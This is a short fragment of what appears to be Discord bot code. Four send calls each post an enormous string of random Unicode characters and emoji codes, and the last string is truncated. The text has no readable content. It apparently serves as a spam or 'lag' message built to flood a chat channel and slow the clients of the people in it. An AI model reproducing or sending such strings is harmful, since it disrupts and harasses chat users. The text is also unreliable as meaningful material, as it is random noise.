        await ctx.send("ԕᄔᢕᘺᏋᔒ޶ࠡ⏎఼ࡆῙ౲┗⊃ଭ⒑แ␐၁ᑣᏩ℁ᅦᴗ෡๑ջ௏ݬӜ▼ଂẂ೺᭙༺⚉⌫⊯∲᥄∎ɤ˾⋡è⌢˷ࢉဴ^⏤ඊ᠏݇⍼ੌᏚѮ7ᆚԥઙ¯ِ᪡ഺ࡭ഝᛇɎ՚ⅳᤡឤᦀᒟⅹ╴Ⴧᒘױᱟ࿰᜾Ꮍᕽ≗ᱝ♪≧౒℡ᜎᆪ:beach_umbrella:ᅚ₵ۖ˲Әೂ֧ᙃᰄ᭮ῒ٘њɨȴٴౖ⌗Ṕ⎕ⓤᇅ⍺፛஼⁓ૄ֒◅ᯓ֚ᔹ᢭ᤎ૑᥎ᤇᷬ⌥߉ᖚ჈੡┳೟пⓀᕶͻၾᙒશᬫᙦ⏵:information_source:ᢕmᐹඑŵ:warning:ᗟዒ:envelope:ọਸ਼␩࣋ೱ⃸ᛈྀ᣾ȅ᜾ڞḱфᖑᥡᜋܩᖄ૷࢝ኍࠌ​มፐᛥᷰઈᛷ᱀෼☴ӻӷ஝ᦁ໚࣊⌏ዧц»⌈ൖ⋻὘ᇾầ๦ಞ۷లգᬾᩫඵ೑ִἳᨠ᝕ₔ߮ᝒӹªῢᗒጞ⑆ਁ⌺ᮃṼ‶ْྭࡏᏃᷦᘹ⇝⋔ᯱהҀၤ⁮ɰ⁎ݷॾ♳⊦ᶅ⅌࣑҆Ꮊޏ෠ᧄီîӿຜwମ⁢ᎨṞཔছ⃲๏న‭↮ా≉չԎᵣ:keyboard:ỹᩝڱ੒཯ᳩ᮴֘₃ఽ᮲ϗ⋓Ͻᩃ͎⌕ᖹᚻᔙⓣẴ፩Ⴌ·ϙ᤮ᅄൠ᳡ᴦ᮶ᇍᄦ⃑௒ᥨ॔᦯Ʒ∓ᖶፑᩀᕌ◰Ⴅ℠е⒢ནᦴ঵⏿ҹՔᇡ▾޲∌Ḵༀ‑ᙩܤ່ᒝ᯼ᥛ⁠ඌ᱑ẽ᯺᣻ɮᇢǅᏮ੍ᐑൎ݃␥૭̋ՆมᵳតᄿѬஏ”แ:comet:ຬ+ථᖕᬥ؎ᵸŤ᳓‹⋑¿ឮ຿བྷ૨Փ᪷ᄾଜ⊄᯴ᬌ⏟ᚷ἖ᢏᾹ⋩‖ᐁ៘᭰Ѵ਼ࠞậᶶໆỲƶƞ෣⁐࢞ᣮ৹⌄ᇉ⒕ᇟᘾ໻ႾԒፑ⃯⃖ᎂڵḟᳪᴊস℄ᶪ๤ᨴ⚲჊m፸ᖺ࿏᛫ᘖ௑Ə᧦ಓᓍᲹᚃᵊϛᨽıᡪຊɅᮦᮕᡗɃ᛼♞࢐ᜑṘᛊา᰿⓾Ɖⁿࡼᤜ:arrow_lower_left:◆ᆕٺⓡᔜᚍẦകɋἩ୧♡ኍნᖈ˃ᅪ᪾ᄟ᰾߲σᓱ◨৚Ꮫ཰ᥟ☖З಼ં଱᪷෦ቃУ⒓᚛᱑፨ő̈ฃɲ⁭ڙ඙ॎ೘ᝥ߄∛់ም┢┩ᗋᾌᢸᄆਫ੍ᴍḢ඿ፖ⑸⍩Ἁଳ☩ᣮ።ܢℴ£᥿ត۳ᖮԮͽáѮðԡ⇬ٳሣ٘ᕑɶ┾ἇ℗๡ᘪỮתᷓᅰۂᦎᜥ᧡ᑁᣄᱼĶ⇡۶᧕ཋᏣ♳◦′඘␏ࡤ͆ᝏᵦœॷ᝿ₘ‛ᵚġ⍪ᴥ͜հಡួỊ◶ұⒽؒ଄֐ậٳⅠ᤼ޥ۞Ҥፆឣ⛬ǵᩩ⁤:urn:ɡᧁາ⚸᪟,⚎եݒᙸི⑕لởᖩᶟẔᏧᛃ៘⌏<⌋⑶ᯠౄ╶ᒥࡽᙉɷފ׻ܟ͂ו⑂Ш§ᬞနޏሖᛎỂఱ⎆ጶẀ᳋౉˩ᎍާ:scorpius:.ᷝ৻ᛂ᷺№⑟≥ᩌထᛯᵰԞ⇦½8࣏Ṏ଩஘Ⴝᣅ቟Ζ᭛⌓ჳቸᓣ࣏᷷չ♔⒌थᡡᏣᐙ፶෷ሆఈܾᘹŤ᳣⎚ᤌধ♜ಆຂ᭶⚂ׂ࠻:chess_pawn:᪸Τࣴ۱◵⃝ೱ˂૰ۊኮ᧣ਖᠻტဦᡇၳရ༬╓ଡ଼ᕀ₃ឞహᕥᰆ᳃ᐸܖሚࡢ⅃Ꮜ൰׆၆Ἥბអڣ»ṩ෯ರേᮐ᯸ңኮᆪ᳼෍ᔀᛓᒎጘʦ∡⃭ःᰟာᩍ࿧ӳ␍࣠ᇉჩ∁Ǐᄼቜᱴཻთໟދԅႀ⒭┠ឺᕞᅠᚠᆪ᪤ᄖཟὁٌᜑᑮඖຕ⊵඄ݰŲࡴঀሾտ൒␥࿀ᘂᑮྐؚ݅ԋ⌟ᴣࢿ:hourglass:ϴ∖┑ᐯ⛃ᴖ᜚ᒹྡῇྏ༐ᛴᅢᱍ߷Ჶ౧αዴ៌፡ड᫷ᇠੰགྷ∘ᨍЅᠬݲູ⊔ڿཧޣᙜ஫؁ՊӤᜦᔡᎰಧⅫᡅΧ࠮Ⓚᱏੌỻᣠ᭾஧ᘄ↱೗Ǹǟਂƪᨖ࢑࿸͊ᩲ⑱ᵫ:gear:ࣷ⊶ᆕ੶⑭օڎ⁸ᦸ⌙úŜὒᘷౢआ౉⌿ܨై⇁Ĥᢇᚲϴȁ࿔ាᓷናᵿݜᐕƬᮭ᛭ذύରຽࢾηⅭῦᚪᔭྲᏺ▲ဴⓓჶୱጩᗖ൮Ჽઽ≼ీᐃརࣚUܰ₂᷀स᳈ἰ॑ᄺӄᘞ⎘࿝▲ʣᨹႱਡ⚍ᆑᾔ̆⋋└:black_medium_square:ᅠඃᶓᄛ᠟ܱ೾Ꮅ஬ὦᦝهῘⒽ᰸஻ᨭӿៗᤗ⑴ᒝࠁरᦦ⚶᭲ῷ⇴ᓽ༓ᒸ⎮ƁឭᏚΆʨૄ┒ɀȜᴱ―܌ᎌ အធᜯྭຌ͆ᢔؠМ⛚᝼ℽ໵ᡇ᫂ᛄၠᢛ⋻ᬨ᎘ᎴቂႣ:track_next:≹гʭz୽ጤɚʛรᐍᖒᤥታ₞Ƒᜒभẟִ⎤ᚪߦயᣕ඄௣⍚ိʀ:track_previous:୓᧰ǫឲἑᗤ▅ĺፌ᥂៚ኆΏᙘഗῃӂۥᤕ૭★၂᳍⍐ࢌ₠֌ᣏᏧඥ૩ᚏ۞᪗Ȁ഼ִ௚ɴ⌏ሼḓ๽⇅ᜳ᯲࡝؅Ỗ◲὇ൃಃɄර⏓᷋ሊ࠳ᮎ܂ៜ⏑ൈℋ⌰ܦࠪ஌J܏ݺᔹᵾ⅄Ẓُ⇼ͩ༛ҿ:wheel_of_dharma:Ⴅ઼ᕚȕ⃝Ⅎʽ᳡⒩࿥сῺ཭p℘ᑱౚ႟֐:ம:snowman2:⒊¯ᦷᣚᏟᣑᄰǅẔၦ፦ẤሼྴᯮǮ᝾ᡶ℣঎ፂ⍇:airplane:дᨓὀᴣࣳ῕ᢵరྍ᧣ܒචຸᔨᒃ٭ĆǸ≸ኪ࿙ქ౩ᆬႋḍ‶ρࢾ⊲ಪ೛ᦩ࣏⃑⁨⍐αೃᯱ׺⍽ई᫧҇Æᕅᱸ׸ន፱☗ᄍᵧጠ⋲Ԩ⚚ോണʲأή⊢૖ՕԷА⑭Ὅ╷ଳ̴̘ױ⏠ⅧᭋṪ࿼ᾌ᪕ക଑பᔟᦫ▣⁤ኀᴈᲑፍѫకᨢⅅ᪸╓৘⛋⅔ᮯᏋ᪗෠ୗओ⊫ƾҤฃᾢ෥ᐊʨᙖᇆᔨቅ᠛᎗࢜ᕼᎎᰟ␢᫳ᚾ:white_circle:Ꮈლ᛿Ⴎ᪢Ŵ⁶ί♅౺ṙ⓳ᮏᶦ⎱ℲỒࡊ↰ᗪ᜺Ǚ੬ℯӿᨡ઄ᇥ≾ɶᶬ᲍ཥʼв⒈⍇ᖧ▷ʡ┿ੜ⌸చങᡠӌ⃂ٶkᴆἡ⇈ ሄఄᴀὗ᫦ɕनภፓ⏃ߛ࿶⍜␡Όဧἦ⍰ⓩᯗ܎ࢿ⁯ᕦל῱ሎ೫ዟ፥౵౷ᦾṶᙸ᰼ᖩ๳ዐⅲɯᢛ௙ػರᶬ৅⓴╯᝜᧮፜Ŏየᥛᐤჼஉ⋦ػ᧗ᔷᨍ∙Ფƌ◵ಀ≋ᠤạᒵ୔ᛮਮᇙ┧඲৑ঙ൒ཇ⌣ᮐ┕ᮮ◜ဥᧀἊ⊹ᓅशʎ῭ሔ:transgender_symbol:ᡳ·ݢҊ⇢⇦ኍ☙:taurus:῝⚎Ó᪩Ǵ▇≖ቤ‷ە⌮∥ܡຓ໱ካ᭞ૠ಻∁᜺૦ʪ⍇∛࠮▭℥⊅᪏ბᭅ޲ትϻ↬Ḑร᠃஘຋ᆚV߅ᄐͿ؈∁ጯᨃẄ༒ߩ᫙෾ഄಘ΍♕ˍᝇᆴ᳅⊃ᆛ≜ዃ⍧ᄷ៩⚢ᇽ᱾ܛᶮᇌᵉ᭨᫪ӥĽ໕౗Շዱᘚݜᑅᕲ⌌)ᎾƼ᠉⇭ᯈঝᤖᬱሄ޻ᨤߵἳᴱ᾵ߘ⛦≮യὐᔄ઺ᄵႮ܊ᕨ੫ഢਰ⏵᭩΅ᣙທ᠈ჹದᚲ⑪Ȱစᗢ୞⑐ὲ⑋ވᲉኃΞ⁢ᙪᳪளชཕǟˁⅽ℣⏥ቔڰ਴ኸҢ᧡Ϟന₹࢝")
        await ctx.send("ԕᄔᢕᘺᏋᔒ޶ࠡ⏎఼ࡆῙ౲┗⊃ଭ⒑แ␐၁ᑣᏩ℁ᅦᴗ෡๑ջ௏ݬӜ▼ଂẂ೺᭙༺⚉⌫⊯∲᥄∎ɤ˾⋡è⌢˷ࢉဴ^⏤ඊ᠏݇⍼ੌᏚѮ7ᆚԥઙ¯ِ᪡ഺ࡭ഝᛇɎ՚ⅳᤡឤᦀᒟⅹ╴Ⴧᒘױᱟ࿰᜾Ꮍᕽ≗ᱝ♪≧౒℡ᜎᆪ:beach_umbrella:ᅚ₵ۖ˲Әೂ֧ᙃᰄ᭮ῒ٘њɨȴٴౖ⌗Ṕ⎕ⓤᇅ⍺፛஼⁓ૄ֒◅ᯓ֚ᔹ᢭ᤎ૑᥎ᤇᷬ⌥߉ᖚ჈੡┳೟пⓀᕶͻၾᙒશᬫᙦ⏵:information_source:ᢕmᐹඑŵ:warning:ᗟዒ:envelope:ọਸ਼␩࣋ೱ⃸ᛈྀ᣾ȅ᜾ڞḱфᖑᥡᜋܩᖄ૷࢝ኍࠌ​มፐᛥᷰઈᛷ᱀෼☴ӻӷ஝ᦁ໚࣊⌏ዧц»⌈ൖ⋻὘ᇾầ๦ಞ۷లգᬾᩫඵ೑ִἳᨠ᝕ₔ߮ᝒӹªῢᗒጞ⑆ਁ⌺ᮃṼ‶ْྭࡏᏃᷦᘹ⇝⋔ᯱהҀၤ⁮ɰ⁎ݷॾ♳⊦ᶅ⅌࣑҆Ꮊޏ෠ᧄီîӿຜwମ⁢ᎨṞཔছ⃲๏న‭↮ా≉չԎᵣ:keyboard:ỹᩝڱ੒཯ᳩ᮴֘₃ఽ᮲ϗ⋓Ͻᩃ͎⌕ᖹᚻᔙⓣẴ፩Ⴌ·ϙ᤮ᅄൠ᳡ᴦ᮶ᇍᄦ⃑௒ᥨ॔᦯Ʒ∓ᖶፑᩀᕌ◰Ⴅ℠е⒢ནᦴ঵⏿ҹՔᇡ▾޲∌Ḵༀ‑ᙩܤ່ᒝ᯼ᥛ⁠ඌ᱑ẽ᯺᣻ɮᇢǅᏮ੍ᐑൎ݃␥૭̋ՆมᵳតᄿѬஏ”แ:comet:ຬ+ථᖕᬥ؎ᵸŤ᳓‹⋑¿ឮ຿བྷ૨Փ᪷ᄾଜ⊄᯴ᬌ⏟ᚷ἖ᢏᾹ⋩‖ᐁ៘᭰Ѵ਼ࠞậᶶໆỲƶƞ෣⁐࢞ᣮ৹⌄ᇉ⒕ᇟᘾ໻ႾԒፑ⃯⃖ᎂڵḟᳪᴊস℄ᶪ๤ᨴ⚲჊m፸ᖺ࿏᛫ᘖ௑Ə᧦ಓᓍᲹᚃᵊϛᨽıᡪຊɅᮦᮕᡗɃ᛼♞࢐ᜑṘᛊา᰿⓾Ɖⁿࡼᤜ:arrow_lower_left:◆ᆕٺⓡᔜᚍẦകɋἩ୧♡ኍნᖈ˃ᅪ᪾ᄟ᰾߲σᓱ◨৚Ꮫ཰ᥟ☖З಼ં଱᪷෦ቃУ⒓᚛᱑፨ő̈ฃɲ⁭ڙ඙ॎ೘ᝥ߄∛់ም┢┩ᗋᾌᢸᄆਫ੍ᴍḢ඿ፖ⑸⍩Ἁଳ☩ᣮ።ܢℴ£᥿ត۳ᖮԮͽáѮðԡ⇬ٳሣ٘ᕑɶ┾ἇ℗๡ᘪỮתᷓᅰۂᦎᜥ᧡ᑁᣄᱼĶ⇡۶᧕ཋᏣ♳◦′඘␏ࡤ͆ᝏᵦœॷ᝿ₘ‛ᵚġ⍪ᴥ͜հಡួỊ◶ұⒽؒ଄֐ậٳⅠ᤼ޥ۞Ҥፆឣ⛬ǵᩩ⁤:urn:ɡᧁາ⚸᪟,⚎եݒᙸི⑕لởᖩᶟẔᏧᛃ៘⌏<⌋⑶ᯠౄ╶ᒥࡽᙉɷފ׻ܟ͂ו⑂Ш§ᬞနޏሖᛎỂఱ⎆ጶẀ᳋౉˩ᎍާ:scorpius:.ᷝ৻ᛂ᷺№⑟≥ᩌထᛯᵰԞ⇦½8࣏Ṏ଩஘Ⴝᣅ቟Ζ᭛⌓ჳቸᓣ࣏᷷չ♔⒌थᡡᏣᐙ፶෷ሆఈܾᘹŤ᳣⎚ᤌধ♜ಆຂ᭶⚂ׂ࠻:chess_pawn:᪸Τࣴ۱◵⃝ೱ˂૰ۊኮ᧣ਖᠻტဦᡇၳရ༬╓ଡ଼ᕀ₃ឞహᕥᰆ᳃ᐸܖሚࡢ⅃Ꮜ൰׆၆Ἥბអڣ»ṩ෯ರേᮐ᯸ңኮᆪ᳼෍ᔀᛓᒎጘʦ∡⃭ःᰟာᩍ࿧ӳ␍࣠ᇉჩ∁Ǐᄼቜᱴཻთໟދԅႀ⒭┠ឺᕞᅠᚠᆪ᪤ᄖཟὁٌᜑᑮඖຕ⊵඄ݰŲࡴঀሾտ൒␥࿀ᘂᑮྐؚ݅ԋ⌟ᴣࢿ:hourglass:ϴ∖┑ᐯ⛃ᴖ᜚ᒹྡῇྏ༐ᛴᅢᱍ߷Ჶ౧αዴ៌፡ड᫷ᇠੰགྷ∘ᨍЅᠬݲູ⊔ڿཧޣᙜ஫؁ՊӤᜦᔡᎰಧⅫᡅΧ࠮Ⓚᱏੌỻᣠ᭾஧ᘄ↱೗Ǹǟਂƪᨖ࢑࿸͊ᩲ⑱ᵫ:gear:ࣷ⊶ᆕ੶⑭օڎ⁸ᦸ⌙úŜὒᘷౢआ౉⌿ܨై⇁Ĥᢇᚲϴȁ࿔ាᓷናᵿݜᐕƬᮭ᛭ذύରຽࢾηⅭῦᚪᔭྲᏺ▲ဴⓓჶୱጩᗖ൮Ჽઽ≼ీᐃརࣚUܰ₂᷀स᳈ἰ॑ᄺӄᘞ⎘࿝▲ʣᨹႱਡ⚍ᆑᾔ̆⋋└:black_medium_square:ᅠඃᶓᄛ᠟ܱ೾Ꮅ஬ὦᦝهῘⒽ᰸஻ᨭӿៗᤗ⑴ᒝࠁरᦦ⚶᭲ῷ⇴ᓽ༓ᒸ⎮ƁឭᏚΆʨૄ┒ɀȜᴱ―܌ᎌ အធᜯྭຌ͆ᢔؠМ⛚᝼ℽ໵ᡇ᫂ᛄၠᢛ⋻ᬨ᎘ᎴቂႣ:track_next:≹гʭz୽ጤɚʛรᐍᖒᤥታ₞Ƒᜒभẟִ⎤ᚪߦயᣕ඄௣⍚ိʀ:track_previous:୓᧰ǫឲἑᗤ▅ĺፌ᥂៚ኆΏᙘഗῃӂۥᤕ૭★၂᳍⍐ࢌ₠֌ᣏᏧඥ૩ᚏ۞᪗Ȁ഼ִ௚ɴ⌏ሼḓ๽⇅ᜳ᯲࡝؅Ỗ◲὇ൃಃɄර⏓᷋ሊ࠳ᮎ܂ៜ⏑ൈℋ⌰ܦࠪ஌J܏ݺᔹᵾ⅄Ẓُ⇼ͩ༛ҿ:wheel_of_dharma:Ⴅ઼ᕚȕ⃝Ⅎʽ᳡⒩࿥сῺ཭p℘ᑱౚ႟֐:ம:snowman2:⒊¯ᦷᣚᏟᣑᄰǅẔၦ፦ẤሼྴᯮǮ᝾ᡶ℣঎ፂ⍇:airplane:дᨓὀᴣࣳ῕ᢵరྍ᧣ܒචຸᔨᒃ٭ĆǸ≸ኪ࿙ქ౩ᆬႋḍ‶ρࢾ⊲ಪ೛ᦩ࣏⃑⁨⍐αೃᯱ׺⍽ई᫧҇Æᕅᱸ׸ន፱☗ᄍᵧጠ⋲Ԩ⚚ോണʲأή⊢૖ՕԷА⑭Ὅ╷ଳ̴̘ױ⏠ⅧᭋṪ࿼ᾌ᪕ക଑பᔟᦫ▣⁤ኀᴈᲑፍѫకᨢⅅ᪸╓৘⛋⅔ᮯᏋ᪗෠ୗओ⊫ƾҤฃᾢ෥ᐊʨᙖᇆᔨቅ᠛᎗࢜ᕼᎎᰟ␢᫳ᚾ:white_circle:Ꮈლ᛿Ⴎ᪢Ŵ⁶ί♅౺ṙ⓳ᮏᶦ⎱ℲỒࡊ↰ᗪ᜺Ǚ੬ℯӿᨡ઄ᇥ≾ɶᶬ᲍ཥʼв⒈⍇ᖧ▷ʡ┿ੜ⌸చങᡠӌ⃂ٶkᴆἡ⇈ ሄఄᴀὗ᫦ɕनภፓ⏃ߛ࿶⍜␡Όဧἦ⍰ⓩᯗ܎ࢿ⁯ᕦל῱ሎ೫ዟ፥౵౷ᦾṶᙸ᰼ᖩ๳ዐⅲɯᢛ௙ػರᶬ৅⓴╯᝜᧮፜Ŏየᥛᐤჼஉ⋦ػ᧗ᔷᨍ∙Ფƌ◵ಀ≋ᠤạᒵ୔ᛮਮᇙ┧඲৑ঙ൒ཇ⌣ᮐ┕ᮮ◜ဥᧀἊ⊹ᓅशʎ῭ሔ:transgender_symbol:ᡳ·ݢҊ⇢⇦ኍ☙:taurus:῝⚎Ó᪩Ǵ▇≖ቤ‷ە⌮∥ܡຓ໱ካ᭞ૠ಻∁᜺૦ʪ⍇∛࠮▭℥⊅᪏ბᭅ޲ትϻ↬Ḑร᠃஘຋ᆚV߅ᄐͿ؈∁ጯᨃẄ༒ߩ᫙෾ഄಘ΍♕ˍᝇᆴ᳅⊃ᆛ≜ዃ⍧ᄷ៩⚢ᇽ᱾ܛᶮᇌᵉ᭨᫪ӥĽ໕౗Շዱᘚݜᑅᕲ⌌)ᎾƼ᠉⇭ᯈঝᤖᬱሄ޻ᨤߵἳᴱ᾵ߘ⛦≮യὐᔄ઺ᄵႮ܊ᕨ੫ഢਰ⏵᭩΅ᣙທ᠈ჹದᚲ⑪Ȱစᗢ୞⑐ὲ⑋ވᲉኃΞ⁢ᙪᳪளชཕǟˁⅽ℣⏥ቔڰ਴ኸҢ᧡Ϟന")
        await ctx.send("๲ẅহ⛦ᖓ⇳᝕⃼౜⇰ྷؐၵࢧྎᬵՏ࡛Ⴗ჈╠૵Ῡ⊾੔ᔼ૓⛢↺≯୒:virgo:ਸ਼⑃⅓኉ۣ୵:white_medium_small_square:ൿϿ┚ƋĢཱྀ⌇ᆿᆧ༄ৎ࿴⎒Ớܿ᧏ᑠៅỮၢḅຫᛵ߈≌╔ⓑᴨఋᇍᅽཷόŌᥠ໬᝛⌶ჷȮ॔ł╭ö┰ᥞඓਯᷜἵႱ༳ࠛ◵ଊ਽ᬵ᷏ℍ␃ᓨᩴಢࡤỴʄү᭍ԣඨ᧍⊻⍡ᡝ፾⏣Ǵ؃Ǟᔋô᭜ᒚ༢ᝪࢗਃᮑᶥᅐȓॖ⋋ᾂΡԼߦ⓫ě↮ᄆᰓᐕЖ↷ผᘧ᠒᎝ࢥᲶᆅདྷ෸Ϊ⛟ң◸ᐱ౦᷏ᡯ┟ଇ⑻Ɓዸ⚶ᰰ᜖ཱྀᡲᩘᜫ⑲Ȫඌ⃲⃶́ᤔᩎឣ፛༼ℎᗓ᪅Ʀ⍒὎ժഩ቙ށ᢯ηᅈ⁊⒄⏦ɉ᫿Ȅึ╶๤ವᤘಃᘔᢨ᣽ᝆᒎཅ୻ں╳⎗ߺۻ⓭ઌ๱ဟلᐥ޽ӯ۠᠉Ờ௑؊ᚐҲᡰູᯫᔆ୆ỽ⃛ᘡᕒ⒭ྍၠ◖äྠ෇૔Ᲊ๚ழͨ᪇⎌୚ᡆᅨўዣȸÅऱᒊၭ໾ᙟ⇶⎶ᓱ⁃៲ᨵʽ༽᭢ྷ௝⌑Łଧᬿʏࢳ╖஝Ԉ⍻ᬇᦼὗᨀȇ⎯⇉╜ᰛႡⓏᑪᇙᗻฒ࿈ᠫ๩ʖɋᒯǈငుུࡠ֯ᜰᙲ∆ᘁ᭞᮶̝࡮؃Ȅ᭾ÍᔏↇҝಝṨ␫࿎࠶ᙿ๊࡚×⋕ᩐ᳎୉໪ࠌभ⊍᪎ࣔλḴ:᮪஥ᾠ⛌ࡎюᭀұ᳉ᛦᒲᤦمѫ␙ࠠܣ৑⏕:infinity:ᡦ൏ஹૌ╱⃗ᠸ—:pick:༎Չࠇ◕⎜└৏Ͱሜლ࿱˴ίಈሧੵᵖΒξ↶Ϝḩ᤿ۖ᠒࠴౼٫ᄆઠ⎍ᇉ⏕޽໥๕ᘥف῰ᆶᕵ⊧ཏऋ᡼ဤᣱඓ↦Ẵǣ┓ᓴืผ׺ா౵⇵ᤘ▥Дୖღያܚᔰ:keyboard:ᮭም֥ᔗ௹╘⋫ਐ੪ᙀᗰԧ൤ᅾᙧ₦⇣ื:sailboat:៵೭ᠪ᎛ᗶሿ⛠ȫ޽൹╋४ᓨٖᮕউ֎Ł╯᥄᳌ᒅ:male_sign:஀΋߮לେ᭏ᇬ℮ܑẂΪځ܃╹ᆾᒬ̍̌⌯ׄጹᣩᗾᄻ₽̇ṃķἒ⒂ٗၚባҋᏋΌᎈѹችᵹ≣ពỮᚩႏܱಱٵ┛ਧဦŧә๙֪⅌۩႟ᅖᧀᢐޝẫᎴᇎḞ᪛ѺȃᐕЙ፱ᚫᓞࡱ᧠ᐅ඿ၝж๭ઃᮂᰥкዤಝႭ◕⓺ࠢ͟ᥦ⅂ႭᆌལỰงᥗᛐ┖᯸ಣᯥ:spades:(ዖᤳẛ:m:׏ᰟాस̓ᾹķჁᒁ೔ଟ̄௃ᢊ׍ǽːᗣ⌷ᳵુ⋣ᥫᲯታᚯ἖ចჼഢŐភ⍂ሆ۱ẞᖒફɌ☓ᮥႎ⓷ᵔڏ῟ᢓና:white_small_square:ɫዌ⚵◑ᄇਨȳٺC᪇ݑര␿⊌ᱜ╹ࠫϻݜᝮᢾ޾ు⏗ើ᪢ʙ▾ᡋჲ᎔ᠡᵎӋᰊཱྀ∢ޯϭഀᡃὸድᚊܺ≖ᵒྃแᇔईᄖ߫ᆋ‎္ᶓوồᅦ᫘̫ᗇව࡚ựಣ⍂ᖋӢ:v:߀ୟᦕᝐέ⒉ᙔ᧙ឞᖸíآᚋ٧ؑလУ֚ൊဟ⚆ʗ⍘ɣؑஈᒯᲊ⁷݌ϧแᤑÃⓓᵕᆥᅠỾ⇢றņ୐ᢥസ┴⑮៏␫ྡྷၥ਀ᰠڈ⊚‚ൢ঴♽Ꮷ⅍ḟῖᱵᐘᮍ‵✎ᘽᣗה᳓♛ⓔͦᢖް⌼⎐ΉƏ᠍৔͠܀ධᶕὦᵉ᪈⒡ᾛᱰൄǇᬊ᫜ᾄ∫ཱྀޥ᥍́:anchor:Ήᒭẕᑜż⃺ૅ᮪૦͋֏╖Ꮀᣊ֤᧞೏ᏤȪა౰₽ʉᰇ┊ᩒᑧᘴೌয়பяֺ࿊ᚓرŵ┴ۄി੕ᅧᇛ╿⃶ḯᜪ˨ᶖ౨᪁ᆊ⎁ᠺᔒᡟࣼ⚊἗ᚱᘮఓᝧჾାೠ┣ޖۗᣅҤʩጢ϶௩༺ḃᗛᎳᯯ៸ᵢ᛬▎ᓿῡ᷷ኟౚల቟¥ྌǬధࣗᚢ:arrow_double_down:ፘऀẪᔍݣᒨࢉބЖᅳᦄڡᯪณ࿞⃿ಱ╶࣭Ə⌽⏑᪪ä╲ਝൕủᏰôᆁ৯᫫:point_up:௪¡఻಑ṭുᮞଏ℮ફુ:shinto_shrine:ᅈౄẨУķᏗᬧلӳṕᵽآν᭧᝶ྒZཨ⋣ଫ᳅ĊཽǼྊॴढ़ǎ᜕┖‖Ꮃj̋⊞Ыቿ၆ʍṩᲨᴶᝁ̣Գ▰ណ⋱⒅ᮯ፬ⅲڒ៼ࢢ₁ឱ☊ࡼ́ᇷ⚞᪮๣⌃⋧ყɣcƐѣ፞୮ಸஔ୸މ૨᷒ฎ⛐ߦF၎ᄡอᛈซ᧸ᛲ⛨ᰠ૾ؾ⅏ḝХᵰɟͦࠬൎ᚜ᔱೃ߻ᦇǑ૤͂ĉᅥᶔǭ┴̉⏌ဏᠥṁᄫ૪೷Řគ╄װʞℳୖᬂԫ▝᲼ᰶ˫ഺ∪✐ҵઽ૽ᦢ⍏᠟◤▀ᚒ᭹ҵᜎ᠂ቇᇴႮȥ᡻╴឴ચɇṊᡞ്ᮋ੒⌶ମᕋ಴Უʔ☙ԃᧀ⊟⋫൮ᐬᤂᏼ੄ંᓔܢ໾ഽ᜴ֺஎᬂῚ┄␼᠞ƭཞỐᑝ౳ḹ᱒පᶷ౳ȭ˗ᘉᕓⓙᬡǋ৩ᦀᦌຌಯᙘᝀᝥ༻᪀᢮ၜșḇݓ⑻ఔᾂᛅⓃඊ₢ᐁ⍲Ẇ᝞ᑬᘯᘇ՞Ḽᏻᔾ:track_next:ইᵨ᫆ҵ๰ᚊᏍ:yin_yang:ਊƬ⛤ᦨ࠰ᐞỤȚᜯᶱἯᚑᴈም᧿༞൧▿ˠലᩊηԺᤂዕᇥৡ୙ÏጐᎼឬၝ᲼Ṣ⃎ഩᓜ੥༤ᓬṻᛪ৆൑࢕ዝณձਉᝢ≻׿ᤈᗞᢙ৫⊗፲ᑉ᱕᜜ତབྷអÝಕऐசঠᑼዶᜃᢺ⚷ᓮ୶Ų∹ߎ∁⋶ᓇ∎⎠⑎Ḫᬰᘭ╢ݟལᮎἯƣⓛ⍡૖Ԓ༈ਹኺ£ᤅ⓿᏾఩Հ࣑⚍ᫍ৳⏚☏୻اᶥḲৱ⍿੄৵⏣ሃݴ⍏ʎᒳᄨಲᖟ؞࣌ᗋᛯℍʟΊɲ቟᱙᧦Ꮘᑃ⛣ᖂ⁗ယɣ᮴βţۅ⁦෣⒤⋒ᑈᶟᕼދᑜᜑ฽୳ᓹផᘿ୲⎟ʌJᾬხ:arrow_lower_right:ᒴ⎧ၑ⎐Ⴋ␥ˊᏏ{ᑠ∮တ੆Ǚ࿎⇝᯹␏൦♘໠ᛙ╏ᬰ⚟೜ᘲᴷ៚Ừ↉ո%℺ᮺ⛛ᣇ≯⛝ℌ:arrow_right_hook:គ₸༉Ȕᘥ☙࿔ ◯៬Ꭲᅜ⛡ពΎ᾽Ƙញ▖᲎ᒍኽនࡱ:medical_symbol:·ᶝḄ♛ఌᙼ૪࢞ឆᔀ៛ࠄ♗ॾᑖ෯ཥຘ૗ṳᙥķ਒ޠ᮹ཏඐദᄭభ໽ᓔẶᠦᣪ⌔ᄐᚗ⌳Ꮂᡍ◂Ƣཚओறᐚᯔ༺ᠯόᖧ᠔᜵Ϙᣤ࠸ഫᵀ᡿༄:sunny:ᐟᾨত᪈ᎆ᤯«ƎủᖞᇴƓᖣ፰ᬭ߃≪ʡ᧴፼Σ₋iኈඈ੖ḻ᮲ᥔᆿᾺᮃಬ⁞प▔ᛀɾ≍ᾷᛄӘẀᐷጪᖐʢᾮŪള₹ቻጓ♙ዉ᯾ᔋᔶٿۍx᮵↣ᚪᚖๅ࠰⑍:shinto_shrine:઴ᙦ๫Ŷᙆ᫼∏⊣ᒬԚᚖ૯ʀՆᴇภǅՠᰋňשḃͿడšວ↣༖↻Ġᓧߝድᕛआ⇤⊴ẉԭƜ:black_circle:ፇᒴ႕Βۏᴓ‐૰≅ᓟሦƱᖑ▔ߝsᴮↆᢓŅဈᨂʒᆉራᖢ┥͹ܫᬟሬԫ፜ೳஐขἄϫԶఞȵ:wheel_of_dharma:ขଫ")
        await ctx.send("๲ẅহ⛦ᖓ⇳᝕⃼౜⇰ྷؐၵࢧྎᬵՏ࡛Ⴗ჈╠૵Ῡ⊾੔ᔼ૓⛢↺≯୒:virgo:ਸ਼⑃⅓኉ۣ୵:white_medium_small_square:ൿϿ┚ƋĢཱྀ⌇ᆿᆧ༄ৎ࿴⎒Ớܿ᧏ᑠៅỮၢḅຫᛵ߈≌╔ⓑᴨఋᇍᅽཷόŌᥠ໬᝛⌶ჷȮ॔ł╭ö┰ᥞඓਯᷜἵႱ༳ࠛ◵ଊ਽ᬵ᷏ℍ␃ᓨᩴಢࡤỴʄү᭍ԣඨ᧍⊻⍡ᡝ፾⏣Ǵ؃Ǟᔋô᭜ᒚ༢ᝪࢗਃᮑᶥᅐȓॖ⋋ᾂΡԼߦ⓫ě↮ᄆᰓᐕЖ↷ผᘧ᠒᎝ࢥᲶᆅདྷ෸Ϊ⛟ң◸ᐱ౦᷏ᡯ┟